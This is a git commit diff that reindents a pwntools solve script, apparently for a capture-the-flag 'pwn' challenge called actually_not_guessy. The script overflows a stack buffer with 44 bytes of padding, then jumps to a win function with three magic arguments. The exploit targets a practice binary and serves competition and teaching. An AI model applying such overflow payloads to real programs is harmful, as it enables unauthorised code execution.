f9c6252ecf1ae6ac06052803e3e6bf3deee7a8a9
John McCann Cunniff Jr <johncunniff1248@gmail.com>
2020-09-18 10:31:37 -0400

    fix indentation goof

--- pwn/actually_not_guessy/solve.py
+++ pwn/actually_not_guessy/solve.py
@@ -5,7 +5,7 @@ import sys
 import string
 import time
 
-#context.log_level = 'DEBUG'
+context.log_level = 'DEBUG'
 #context.terminal = ['/usr/bin/termite', '-e']
 
 e = ELF('./actually_not_guessy')
@@ -16,13 +16,14 @@ else:
     p = process('./actually_not_guessy')
     #gdb.attach(p, 'b *main, *vuln')
 
-    p.recvuntil('!')
-    p.sendline(b'A'*44  
-        + p32(e.sym.all_I_do_is_win)
-        + b'B'*4
-        + p32(0x600DC0DE)
-        + p32(0xACCE5515)
-        + p32(0xFEA51B1E)
-        )
-    print(p.recvall())
-    p.close()
+p.recvuntil('!')
+p.sendline(
+    b'A'*44
+    + p32(e.sym.all_I_do_is_win)
+    + b'B'*4
+    + p32(0x600DC0DE)
+    + p32(0xACCE5515)
+    + p32(0xFEA51B1E)
+)
+print(p.recvall())
+p.close()
